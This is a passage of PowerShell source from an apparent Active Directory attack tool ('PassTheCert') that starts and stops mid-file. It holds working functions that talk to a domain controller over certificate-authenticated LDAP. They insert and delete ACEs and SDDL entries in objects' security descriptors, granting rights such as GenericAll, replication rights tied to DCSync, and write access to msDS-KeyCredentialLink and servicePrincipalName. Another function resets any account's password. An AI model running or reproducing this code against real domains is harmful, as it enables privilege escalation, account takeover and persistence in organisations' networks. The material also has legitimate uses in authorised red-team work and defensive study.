    $NewSD = New-Object byte[] $SD.BinaryLength
    $SD.GetBinaryForm($NewSD, 0)

    $LdapConnection.SendRequest(
        (New-Object System.DirectoryServices.Protocols.ModifyRequest(
            $TargetDN, 
            [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, 
            "nTSecurityDescriptor", 
            $NewSD
        ))
    ) |Out-Null

    Write-Host "[+] Successfully Created Inbound ACE $ACEString Provided To Principal '$IdentityDN' Towards '$TargetDN' !"
    
    # Some ACEs doesn't have 'ObjectAceType' attribute (e.g. 'GenericAll'), hence being set to None.
    # Writing the Check / Restoration texts for convenience
    if ($AccessRightGUID -eq [Guid]::Empty) {
        Write-Host "[*] [Check] Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection `$LdapConnection -ObjectDN '$TargetDN' |?{ `$_.SecurityIdentifier -eq '$(_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid")' }"
        Write-Host "[*] [Delete] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$AceQualifier' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue $AccessMaskValue)'"
    } else {
        Write-Host "[*] [Check] Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection `$LdapConnection -ObjectDN '$TargetDN' |?{ `$_.SecurityIdentifier -eq '$(_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid")' }"
        Write-Host "[*] [Delete] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$AceQualifier' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue $AccessMaskValue)' -AccessRightGUID '$AccessRightGUID'"
    }
}


function _DeleteInboundACE {
    
    <#

        .SYNOPSIS

            Deletes an inbound ACE for a principal into a targeted object. In other words, it deletes an ACE granted/denied to the principal (source) over the targeted object (destination)

            - You may manually check any `PrincipalTo*.txt` file, to get a glance of possible ACEs.
            - The inbound ACE to delete MUST already exist in the target's inbound ACEs (i.e. in its 'nTSecurityDescriptor').

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER IdentityDN

            [System.String] 

            The source principal's identity of the ACE to delete (i.e. principal already granted / denied with the ACE)

        .PARAMETER AceQualifier

            [System.String] 
            
            The Qualifier of the ACE to delete (i.e. `AccessAllowed`, `AccessDenied`, `SystemAudit`, or `SystemAlarm`)

        .PARAMETER AccessMaskNames

            [System.String] 
            
            The Access Mask Name(s) (comma-separated, if multiple) of the ACE to delete (among `CreateChild`, `DeleteChild`, `ListChildren`, `Self`, `ReadProperty`, `WriteProperty`, `DeleteTree`, `ListObject`, `ExtendedRight`, `Delete`, `ReadControl`, `GenericExecute`, `GenericWrite`, `GenericRead`, `WriteDacl`, `WriteOwner`, `GenericAll`, `Synchronize`, and `AccessSystemSecurity`)

        .PARAMETER AccessRightName

            [System.String] 
            
            The Access Right Name (i.e. ObjectAceType) of the ACE to delete (Optional).

            - If not specified, this attribute is set to $null.
            - Some ACE doesn't have an ObjectAceType (as per `PrincipalTo*.txt`). For instance, `GenericAll` ACEs are provided without `ObjectAceType`, hence this attribute MUST NOT be provided whenever we want to delete a `GenericAll`-type'ed ACE.

        .PARAMETER TargetDN

            [System.String] 
            
            The identity of the targeted nTSecurityDescriptor which the inbound ACE is applied

        .PARAMETER AccessRightGUID

            [System.String] 
            
            The Access Right GUID (i.e. ObjectAceType's GUID) of the ACE to delete (Optional).

            - Not required if -AccessRightName is specified.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _DeleteInboundACE -LdapConnection $LdapConnection -IdentityDN 'CN=Zack ZS. STRIFE,CN=Users,DC=X' -TargetDN 'CN=ESARVI01,CN=Computers,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'GenericAll'

            Deletes the inbound ACE `[AceQualifier='AccessAllowed', AccessMasks='GenericAll', ObjectAceType=NULL]` provided to the principal `Zack ZS. STRIFE` towards the computer target object `ESARVI01` (as per `PrincipalToComputer.txt`). In other words, `Zack ZS. STRIFE` will no longer have `GenericAll` rights over the target `ESARVI01`.

            - As per `PrincipalToComputer.txt`, `GenericAll` Access Mask implies the ACE has no `ObjectAceType` (i.e. NULL), hence not specified.

        .EXAMPLE

            _DeleteInboundACE -LdapConnection $LdapConnection -IdentityDN 'CN=Wanha BE. ERUT,CN=Users,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'ExtendedRight' -AccessRightName 'DS-Replication-Get-Changes' -TargetDN 'DC=X'

            Deletes the inbound ACE `[AceQualifier='AccessAllowed', AccessMasks='ExtendedRight', ObjectAceType='DS-Replication-Get-Changes']` provided to the principal `Wanha BE. ERUT` towards the domain target object `DC=X` (as per `PrincipalToDomain.txt`). In other words, `Wanha BE. ERUT`  will no longer have `DS-Replication-Get-Changes-All` rights over the target `DC=X` (W4r3n't y4 lO0k1n' 2 DC$ynC ?!)

            - As per `PrincipalToDomain.txt`, `DS-Replication-Get-Changes` Access Right is associated with Access Mask `ExtendedRight`.

        .EXAMPLE

            _DeleteInboundACE -LdapConnection $LdapConnection -IdentityDN 'CN=Wanha BE. ERUT,CN=Users,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'ExtendedRight' -AccessRightGUID '12345678-1234-1234-1234-123456789012' -TargetDN 'CN=Smart SC. CARDY,CN=Users,DC=X'

            Deletes the inbound ACE `[AceQualifier='AccessAllowed', AccessMasks='ExtendedRight', ObjectAceType='12345678-1234-1234-1234-123456789012' (?¿Whut¿?)]` provided to the principal `Wanha BE. ERUT` towards the user target object `Smart SC. CARDY` (as per `PrincipalToUser.txt`). In other words, `Wanha BE. ERUT` will no longer have `?¿Special Permissions¿?` (?¿Whut¿?) rights over the target `CN=Smart SC. CARDY,CN=Users,DC=X`

            - As per `PrincipalTo...`, I mean... WHUT?!

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

        .LINK 

            https://learn.microsoft.com/en-us/dotnet/api/system.security.accesscontrol.acequalifier (Ace Qualifiers)

        .LINK 

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights (Access Masks)

        .LINK 

            https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb (Access Right Names, i.e. ObjectAceTypes)

    #>
        
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the source principal's identity of the ACE to delete (i.e. principal granted / denied with the ACE)")]
        [System.String]$IdentityDN,

        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the Qualifier of the ACE to delete (i.e. 'AccessAllowed', 'AccessDenied', 'SystemAudit', or 'SystemAlarm')")]
        [ValidateSet('AccessAllowed', 'AccessDenied', 'SystemAudit', 'SystemAlarm')]
        [System.String]$AceQualifier,

        [Parameter(Position=3, Mandatory=$true, HelpMessage="Enter the Access Mask Name(s) (comma-separated, if multiple) of the ACE to delete (among 'CreateChild', 'DeleteChild', 'ListChildren', 'Self', 'ReadProperty', 'WriteProperty', 'DeleteTree', 'ListObject', 'ExtendedRight', 'Delete', 'ReadControl', 'GenericExecute', 'GenericWrite', 'GenericRead', 'WriteDacl', 'WriteOwner', 'GenericAll', 'Synchronize', and 'AccessSystemSecurity')")]
        [System.String]$AccessMaskNames,

        [Parameter(Position=4, Mandatory=$false, HelpMessage="Enter the Access Right Name (i.e. ObjectAceType) of the ACE to delete (refer to '[MS-ADTS]: 5.1.3.2.1 Control Access Rights', and 'PrincipalTo*.txt')")]
        [PSDefaultValue(Help="Empty string to handle ACEs without ObjectAceType (i.e. with access mask(s) only, such as 'GenericAll')")]
        [System.String]$AccessRightName = '',

        [Parameter(Position=5, Mandatory=$true, HelpMessage="Enter the destination object's identity of the ACE to delete (i.e. targeted object against which the ACE applies)")]
        [System.String]$TargetDN,

        [Parameter(Position=6, Mandatory=$false, HelpMessage="Enter the Access Right GUID (i.e. ObjectAceType) of the ACE to delete (you may refer to '[MS-ADTS]: 5.1.3.2.1 Control Access Rights', and 'PrincipalTo*.txt'). (... ¿ do you really need to specify it, as you may conveniently use -AccessRightName instead ? ...)")]
        [PSDefaultValue(Help="Empty string by default if not specified. Can specifying INVALID GUIDs (e.g. '12345678-1234-1234-1234-123456789012') have side effects ? ¯\_(*_*)_/¯")]
        [System.String]$AccessRightGUID = ''
    )

    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    $ACEString = ""

    $AccessMaskValue = _Helper-GetValueOfACEAccessMaskNames -AccessMaskNames $AccessMaskNames;

    if ($AccessRightGUID) {
        # We shouldn't (?) be here. See '_CreateInboundACE' function.
        $ACEString = "[AceQualifier='$AceQualifier', AccessMasks='$AccessMaskNames', ObjectAceType='$AccessRightGUID']"
    } else {
        $AccessRightGUID = _Helper-GetGUIDOfACEAccessRightName -AccessRightName $AccessRightName;
        # Some ACEs doesn't have 'ObjectAceType' attribute (e.g. 'GenericAll'), hence being set to None.
        if ($AccessRightGUID -eq [Guid]::Empty) {
            $ACEString = "[AceQualifier='$AceQualifier', AccessMasks='$AccessMaskNames', ObjectAceType=NULL]"
        } else {
            $ACEString = "[AceQualifier='$AceQualifier', AccessMasks='$AccessMaskNames', ObjectAceType='$AccessRightName']"
        }
    }

    Write-Verbose "[*] Deleting Inbound ACE $ACEString Provided To Principal '$IdentityDN' Towards '$TargetDN'..."

    $IdentitySID = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid"
    $SD = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute "nTSecurityDescriptor"
    $InboundACEs = _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN $TargetDN

    Write-Verbose "[*] Inbound ACEs Provided To Principal '$IdentityDN' Towards '$TargetDN' Are:`r`n$($InboundACEs | Where-Object { $_.SecurityIdentifier -eq $IdentitySID } | Out-String)"

    # Remove the inbound ACE only if it's found among the target's inbound ACEs.
    $i = 0;
    foreach ($ACE in $InboundACEs) {
        if ($ACE.SecurityIdentifier -eq $IdentitySID -and $ACE.AccessMaskNames -eq $AccessMaskNames -and $ACE.ObjectAceType -eq $AccessRightGUID -and $ACE.AceQualifier -eq 'AccessAllowed') {
            $SD.DiscretionaryAcl.RemoveAce($i) |Out-Null
            $NewSD = New-Object byte[] $SD.BinaryLength
            $SD.GetBinaryForm($NewSD, 0)
            $LdapConnection.SendRequest(
                (New-Object System.DirectoryServices.Protocols.ModifyRequest(
                    $TargetDN, 
                    [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, 
                    "nTSecurityDescriptor", 
                    $NewSD
                ))
            ) |Out-Null
            
            Write-Host "[+] Successfully Deleted Inbound ACE $ACEString Provided To Principal '$IdentityDN' Towards '$TargetDN' !"

            #Write-Verbose "[*] Remaining Inbound ACEs Provided To Principal '$IdentityDN' Towards '$TargetDN' Are:`r`n$(_GetInboundACEs -LdapConnection $LdapConnection -ObjectDN $TargetDN | Where-Object { $ACE.SecurityIdentifier -eq $IdentitySID } |Out-String)"
            return 
        }
        $i++;
    }

    # Otherwise, the specified inbound ACE is not found.
    Write-Host "[!] Inbound ACE $ACEString Provided To Principal '$IdentityDN' Towards '$TargetDN' Doesn't Exist !"
    return
}


function _GetInboundSDDLs {
    
    <#

        .SYNOPSIS

            Returns the SDDL String of all the inbound ACEs applied against a specified targeted object.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER ObjectDN

            [System.String]
            
            The identity of the targeted object whose SDDL String inbound ACEs must be retrieved.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _GetInboundSDDLs -LdapConnection $LdapConnection -ObjectDN 'CN=John JD. DOE,CN=Users,DC=X'

            Get the SDDL String of all the inbound ACEs applied against the `John JD. DOE` object.

        .EXAMPLE

            _GetInboundSDDLs -LdapConnection $LdapConnection -ObjectDN 'CN=John JD. DOE,CN=Users,DC=X' |%{$_ -replace '\(',"`n  " -replace '\)',''}

            Get the SDDL String of all the inbound ACEs applied against the `John JD. DOE` object, where each defined ACE is CRLF-separated.

        .OUTPUTS

            [PSCustomObject]{}
            
            The SDDL String of all the inbound ACEs applied against a specified targeted object.

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

        .LINK 

            https://learn.microsoft.com/en-us/dotnet/api/system.security.accesscontrol.accesscontrolsections

        .LINK 

            https://learn.microsoft.com/en-us/windows/win32/adschema/a-ntsecuritydescriptor

        .LINK 

            `DeepDiveIntoACEsAndSDDLs` README

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
        
        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the targeted object whose SDDL String must be retrieved.")]
        [System.String]$ObjectDN
    )
    
    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    Write-Verbose "[*] Retrieving List Of Inbound SDDLs Over '$ObjectDN'..."

    $SearchResponse = $LdapConnection.SendRequest(
        (New-Object System.DirectoryServices.Protocols.SearchRequest(
            $ObjectDN,
            '(objectClass=*)', 
            [System.DirectoryServices.SearchScope]::Base,
            'nTSecurityDescriptor'
        ))
    )
    $SDBytes = $SearchResponse.Entries[0].Attributes['nTSecurityDescriptor'][0]
    $SD = New-Object System.Security.AccessControl.RawSecurityDescriptor($SDBytes, 0)
    return $SD.GetSddlForm([System.Security.AccessControl.AccessControlSections]::All)
}


function _CreateInboundSDDL {
    
    <#

        .SYNOPSIS

            Creates an inbound SDDL (Security Descriptor Definition Language) for a principal into a targeted object's attribute. In other words, it grants/denies an SDDL to the principal (source) over the attribute of a targeted object (destination).

            - You may check the `DeepDiveIntoACEsAndSDDLs` to get a glance of the SDDL format.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER SDDLACEType

            [System.String] 
            
            The ACE type of the SDDL entry to be created (e.g. `OA` or `OD`) (Optional). For instance, to create an SDDL entry like `O:BAD:(OA;CI;RPWP;bf967915-0de6-11d0-a285-00aa003049e2;;S-1-1-0)`, this parameter MUST be set to `OA` (i.e. `SDDL_OBJECT_ACCESS_ALLOWED`).

            - If not specified, this parameter is set to `OA` (i.e. `SDDL_OBJECT_ACCESS_ALLOWED`)

        .PARAMETER SDDLACERights

            [System.String] 
            
            The Right(s) of the SDDL entry to be created, among `RC`, `SD`, `WD`, `WO`, `RP`, `WP`, `CC`, `DC`, `LC`, `SW`, `LO`, `DT` (comma-separated, if multiple) (Optional). For instance, to create an SDDL entry like `O:BAD:(OA;CI;RCSDWDWORPWPCCDCLCSWLODT;;;S-1-1-0)`, this parameter MUST be set to `RCSDWDWORPWPCCDCLCSWLODT` (i.e. `SDDL_READ_CONTROL`, `SDDL_STANDARD_DELETE`, `SDDL_WRITE_DAC`, `SDDL_WRITE_OWNER`, `SDDL_READ_PROPERTY`, `SDDL_WRITE_PROPERTY`, `SDDL_CREATE_CHILD`, `SDDL_DELETE_CHILD`, `SDDL_LIST_CHILDREN `SDDL_SELF_WRITE`, `SDDL_LIST_OBJECT`, `SDDL_DELETE_TREE`).

            - If not specified, this parameter is set to `RPWP` (i.e. `SDDL_READ_PROPERTY`, `SDDL_WRITE_PROPERTY`)

        .PARAMETER IdentityDN

            [System.String] 
            
            The identity of the principal to be provided the SDDL ACE entry.

        .PARAMETER TargetDN

            [System.String] 
            
            The identity of the targeted object against which the SDDL ACE entry applies.

        .PARAMETER Attribute

            [System.String] 
            
            The attribute of the targeted object against which the SDDL ACE entry applies. (Optional)

            - If not specified, the created ACE entry won't have an `ObjectAceType` GUID.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _CreateInboundSDDL -LdapConnection $LdapConnection -IdentityDN 'CN=J0hn JR. RIPP3R,CN=Users,DC=X' -TargetDN 'CN=SVC SU. USER,CN=Users,DC=X' -Attribute 'serviceprincipalname'

            Creates an SDDL ACE entry allowing (default) the principal `J0hn JR. RIPP3R` the following ACE Rights against the `SVC SU. USER`:`serviceprincipalname` attribute: `SDDL_READ_PROPERTY`, `SDDL_WRITE_PROPERTY` (default)

        .EXAMPLE

            _CreateInboundSDDL -LdapConnection $LdapConnection -IdentityDN 'CN=Wanha BE. EDMIN,CN=Users,DC=X' -TargetDN 'CN=COMPUTATOR,CN=Computers,DC=X' -SDDLACEType 'OA' -SDDLACERights 'RCSDWDWORPWPCCDCLCSWLODT'

            Creates an SDDL ACE entry allowing the principal `Wanha BE. EDMIN` the following ACE Rights against the `COMPUTATOR$` object: `RCSDWDWORPWPCCDCLCSWLODT` (i.e. `SDDL_READ_CONTROL`, `SDDL_STANDARD_DELETE`, `SDDL_WRITE_DAC`, `SDDL_WRITE_OWNER`, `SDDL_READ_PROPERTY`, `SDDL_WRITE_PROPERTY`, `SDDL_CREATE_CHILD`, `SDDL_DELETE_CHILD`, `SDDL_LIST_CHILDREN `SDDL_SELF_WRITE`, `SDDL_LIST_OBJECT`, `SDDL_DELETE_TREE`)

        .EXAMPLE

            _CreateInboundSDDL -LdapConnection $LdapConnection -IdentityDN 'CN=Wanha BE. Y4,CN=Users,DC=X' -TargetDN 'CN=Smart SC. CARDY,CN=Users,DC=X' -Attribute 'msDS-KeyCredentialLink' -SDDLACEType 'OA' -SDDLACERights 'RPWP'

            Creates an SDDL ACE entry allowing the principal `Wanha BE. Y4` the following ACE Right against the `Smart SC. CARDY`:`msDS-KeyCredentialLink` attribute: `SDDL_READ_PROPERTY`, `SDDL_WRITE_PROPERTY`

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.modifyrequest
        
        .LINK 

            https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language (Security Descriptor Definition Language)

        .LINK 

            https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format (Security Descriptor String Format)

        .LINK 

            https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings (ACE Strings, Directory service object access rights)

        .LINK 

            https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings (SID String)

        .LINK 

            https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/sddl-for-device-objects (SDDL for device objects)

        .LINK 

            https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/f4296d69-1c0f-491f-9587-a960b292d070 (Syntax)

        .LINK 

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights (Access Masks)

        .LINK 
        
            https://learn.microsoft.com/en-us/windows/win32/secauthz/well-known-sids (Well-known SIDs)

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$false, HelpMessage="Enter the Type of the SDDL entry to create (e.g. 'OA' or 'OD', for 'SDDL_OBJECT_ACCESS_ALLOWED' or 'SDDL_OBJECT_ACCESS_DENIED', respectively)")]
        [System.String]$SDDLACEType,

        [Parameter(Position=2, Mandatory=$false, HelpMessage="Enter the Right(s) of the SDDL entry to create")]
        [System.String]$SDDLACERights,

        [Parameter(Position=3, Mandatory=$true, HelpMessage="Enter the source principal's identity of the SDDL entry to create (i.e. principal granted / denied with the SDDL)")]
        [System.String]$IdentityDN,

        [Parameter(Position=4, Mandatory=$true, HelpMessage="Enter the destination object's identity of the SDDL entry to create (i.e. targeted object against which the SDDL applies)")]
        [System.String]$TargetDN,

        [Parameter(Position=5, Mandatory=$false, HelpMessage="Enter the attribute's lDAPDsiplayName (as per 'ADAttributeGUIDs.csv') of the destination object's identity of the SDDL entry to create (i.e. attribute of the targeted object against which the SDDL applies)")]
        [System.String]$Attribute
    )
    
    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    # Associating an SDDL Access Right with its Access Mask
    #   https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings
    #   https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights
    $SDDLAccessMasks = @{
        'RC' = 'ReadControl';
        'SD' = 'Delete';
        'WD' = 'WriteDacl';
        'WO' = 'WriteOwner';
        'RP' = 'ReadProperty';
        'WP' = 'WriteProperty';
        'CC' = 'CreateChild';
        'DC' = 'DeleteChild';
        'LC' = 'ListChildren';
        'SW' = 'Self';
        'LO' = 'ListObject';
        'DT' = 'DeleteTree';
    }

    # Default values
    if (-not $SDDLACEType) { $SDDLACEType = 'OA' } # SDDL_OBJECT_ACCESS_ALLOWED
    if (-not $SDDLACERights) { $SDDLACERights = 'RPWP' } # SDDL_READ_PROPERTY, SDDL_WRITE_PROPERTY
    
    $IdentitySID = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute 'objectSid'

    # Without the LDAP attribute specified, the ACE entry has no ObjectAceType
    if ($Attribute) {
        $SDDLObjectAceType = _Helper-GetGUIDOfLDAPAttributeName -LDAPAttributeName $Attribute
        $ObjectAceFlags = [System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent
        $ACEString = "($($SDDLACEType);;$($SDDLACERights);$SDDLObjectAceType;;$($IdentitySID))"
        $TargetString = "'$TargetDN':'$Attribute'"
    } else {
        $SDDLObjectAceType = [Guid]::Empty
        $ObjectAceFlags = [System.Security.AccessControl.ObjectAceFlags]::None
        $ACEString = "($($SDDLACEType);;$($SDDLACERights);;;$($IdentitySID))"
        $TargetString = "'$TargetDN'"
    }

    Write-Verbose "[*] Inserting SDDL ACE String '$ACEString' For Principal '$IdentityDN', Targeting $TargetString..."

    if ($SDDLACEType -eq 'OA') { $NewAceQualifier = [System.Security.AccessControl.AceQualifier]::AccessAllowed; $ACETypeString = 'AccessAllowed' }
    elseif ($SDDLACEType -eq 'OD') { $NewAceQualifier = $NewAceQualifier = [System.Security.AccessControl.AceQualifier]::AccessDenied; $ACETypeString = 'AccessDenied' }

    # Converting SDDL format to Access Mask format. E.g.: 'RPWP' becomes 'ReadProperty,WriteProperty'
    $SDDLACERightsAccessMasks = ($SDDLACERights -split '([A-Z]{2})' |?{ $_ -match '[A-Z]+'} |%{ $SDDLAccessMasks[$_] }) -join ','
    $AccessMaskValue = _Helper-GetValueOfACEAccessMaskNames $SDDLACERightsAccessMasks
    
    $SD = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'nTSecurityDescriptor'
    $SD.DiscretionaryAcl.InsertAce(
        0,
        (New-Object System.Security.AccessControl.ObjectAce(
            [System.Security.AccessControl.AceFlags]::None,                 # AceFlags (Inherited, ContainerInherit, etc.)
            [System.Security.AccessControl.AceQualifier]$NewAceQualifier,   # AceQualifier (AccessAllowed, AccessDenied, SystemAudit, SystemAlarm)
            [System.Int32]$AccessMaskValue,                                 # AccessMask (GenericAll, ReadProperty, WriteProperty, etc.)
            [System.Security.Principal.SecurityIdentifier]$IdentitySID,     # SecurityIdentifier (Trustee's SID)
            [System.Security.AccessControl.ObjectAceFlags]$ObjectAceFlags,  # ObjectAceFlags (None, ObjectAceTypePresent, InheritedObjectAceTypePresent)
            [Guid]$SDDLObjectAceType,                                       # ObjectAceType (Access Right's GUID)
            [Guid]::Empty,                                                  # InheritedObjectAceType (Inherited Right's GUID)
            [bool]$false,                                                   # isCallback
            [byte[]]$null                                                   # opaque
        ))
    )
    $NewSD = New-Object byte[] $SD.BinaryLength
    $SD.GetBinaryForm($NewSD, 0)

    $LdapConnection.SendRequest(
        (New-Object System.DirectoryServices.Protocols.ModifyRequest(
            $TargetDN, 
            [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, 
            'nTSecurityDescriptor', 
            $NewSD
        ))
    ) |Out-Null

    Write-Host "[+] Successfully Inserted SDDL ACE String '$ACEString' For Principal '$IdentityDN', Targeting $TargetString !"

    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'GetInboundSDDLs' -LdapConnection `$LdapConnection -ObjectDN '$TargetDN' |%{(`$_ -replace '\(',`"``n  `" -replace '\)','').Split(`"``n`") } |Select-String -Pattern '$(_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid")`$'"
    if ($Attribute) {
        Write-Host "[*] [Delete] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$ACETypeString' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue $AccessMaskValue)' -AccessRightGUID '$SDDLObjectAceType'"
    } else {
        Write-Host "[*] [Delete] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$ACETypeString' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue $AccessMaskValue)'"
    }
    return
}


function _UpdatePasswordOfIdentity {
    
    <#

        .SYNOPSIS

            Updates the password of the specified identity.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER IdentityDN

            [System.String] 
            
            The identity of the targeted account (whose password must be updated).

        .PARAMETER NewPassword

            [System.String] 
            
            The new password of the targeted account.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _UpdatePasswordOfIdentity -LdapConnection $LdapConnection -IdentityDN 'CN=Wordy WP. PRESS,CN=Users,DC=X' -NewPassword 'NewP@ssw0rd123!'

            Updates the password of account `Wordy WP. PRESS` to `NewP@ssw0rd123!`

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection
        
        .LINK 
        
            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.modifyrequest

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the targeted account (whose password must be updated)")]
        [System.String]$IdentityDN,

        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the new password of the targeted account")]
        [System.String]$NewPassword
    )
    
    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    Write-Verbose "[*] Updating Password Of Account '$IdentityDN'..."

    $LdapConnection.SendRequest(
        (New-Object System.DirectoryServices.Protocols.ModifyRequest(
            $IdentityDN, 
            [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "unicodePwd", 
            [System.Text.Encoding]::Unicode.GetBytes("`"$NewPassword`"")
        ))
    ) |Out-Null
    
    Write-Host "[+] Successfully Updated Password Of '$IdentityDN' To: $NewPassword"
    return
}


function _OverwriteValueInAttribute {
    
    <#

        .SYNOPSIS

            Replaces the value(s) from an existing attribute on a targeted object.

            - This function overwrites ALL existing values of the specified attribute with the provided value.
            - For instance, if the `description` attribute was set to `Whoami1?!`, overwritting it with value `Whoami2?!` would set its content to `Whoami2?!`.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER IdentityDN

            [System.String] 
            
            The identity of the targeted object whose attribute's value must be overwritten (e.g. `CN=John JD. DOE,CN=Users,DC=X`).

        .PARAMETER Attribute

            [System.String] 
            
            The attribute of the targeted object (e.g. `description`).

        .PARAMETER Value

            [System.String] 
            
